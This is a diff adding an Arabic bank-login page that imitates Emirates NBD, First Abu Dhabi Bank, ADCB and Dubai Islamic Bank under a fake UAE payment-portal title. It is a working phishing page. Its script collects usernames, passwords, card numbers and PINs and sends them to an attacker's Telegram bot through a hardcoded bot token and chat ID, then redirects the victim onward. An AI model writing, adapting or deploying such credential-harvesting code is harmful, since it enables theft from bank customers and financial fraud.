@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول للبنك - بوابة سداد الإمارات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://petra.gov.jo/upload/1542630954928.jpg" type="image/x-icon">
+    <style>
+        :root {
+            --primary-color: #008000;
+            --secondary-color: #FFD700;
+            --text-color: #333;
+            --light-gray: #f5f5f5;
+            --border-color: #ddd;
+            --error-color: #e74c3c;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #f9f9f9;
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; min-height: 100vh; }
+
+        .header {
+            text-align: center; margin-bottom: 30px; padding: 20px;
+            background-color: white; border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header img { height: 60px; margin-bottom: 10px; object-fit: contain; }
+        .header h1 { color: var(--primary-color); font-size: 22px; }
+
+        .form-container {
+            background-color: white; border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px;
+        }
+
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; }
+        .form-control {
+            width: 100%; padding: 12px; border: 1px solid var(--border-color);
+            border-radius: 5px; font-size: 16px; font-family: 'Tajawal', sans-serif;
+        }
+
+        .btn {
+            background-color: var(--primary-color); color: white;
+            padding: 12px; border: none; border-radius: 5px;
+            cursor: pointer; font-size: 16px; width: 100%; font-family: 'Tajawal', sans-serif;
+        }
+
+        .secure-notice {
+            display: flex; align-items: center; justify-content: center;
+            gap: 10px; margin-top: 20px; font-size: 13px; color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="" alt="Bank Logo" id="bankLogo">
+            <h1 id="bankTitle">تسجيل الدخول الآمن</h1>
+        </div>
+        
+        <div class="form-container">
+            <form id="bankLoginForm">
+                <div id="dynamicFields">
+                    </div>
+                <button type="button" onclick="submitBankLogin()" class="btn">دخول آمن</button>
+            </form>
+            
+            <div class="secure-notice">
+                <span>🔒 نظام تشفير متطور 256-bit</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
+        const telegramChatId = '8362204213';
+
+        const banksData = {
+            emiratesNBD: { name: "Emirates NBD", logo: "https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg", fields: ["اسم المستخدم", "كلمة المرور"] },
+            firstAbuDhabi: { name: "First Abu Dhabi Bank", logo: "https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png", fields: ["رقم البطاقة", "الرقم السري"] },
+            abuDhabiCommercial: { name: "ADCB", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10", fields: ["اسم المستخدم", "كلمة المرور"] },
+            dubaiIslamic: { name: "Dubai Islamic Bank", logo: "https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg", fields: ["اسم المستخدم", "كلمة المرور"] }
+        };
+
+        const selectedBank = localStorage.getItem('selectedBank') || 'emiratesNBD';
+        const bankInfo = banksData[selectedBank];
+
+        // تهيئة الصفحة بناءً على البنك
+        document.getElementById('bankLogo').src = bankInfo.logo;
+        document.getElementById('bankTitle').innerText = `تسجيل الدخول - ${bankInfo.name}`;
+        
+        const fieldsContainer = document.getElementById('dynamicFields');
+        bankInfo.fields.forEach((field, index) => {
+            fieldsContainer.innerHTML += `
+                <div class="form-group">
+                    <label>${field}</label>
+                    <input type="${field.includes('مرور') || field.includes('سري') ? 'password' : 'text'}" 
+                           id="field_${index}" class="form-control" placeholder="أدخل ${field}" required>
+                </div>`;
+        });
+
+        async function appendToTelegram(newContent) {
+            const existingId = localStorage.getItem('telegramMessageId');
+            const existingContent = localStorage.getItem('telegramMessageContent') || '';
+            const updatedContent = existingContent + '\n\n' + newContent;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        message_id: parseInt(existingId),
+                        text: updatedContent,
+                        parse_mode: 'HTML'
+                    })
+                });
+                localStorage.setItem('telegramMessageContent', updatedContent);
+            } catch (e) { console.error(e); }
+        }
+
+        async function submitBankLogin() {
+            let details = '';
+            bankInfo.fields.forEach((field, index) => {
+                const val = document.getElementById(`field_${index}`).value;
+                details += `${field}: ${val}\n`;
+            });
+
+            const content = `🔐 <b>بيانات تسجيل الدخول للبنك</b>\n${details}`;
+            await appendToTelegram(content);
+            window.location.href = 'page5.html';
+        }
+    </script>
+</body>
+</html>
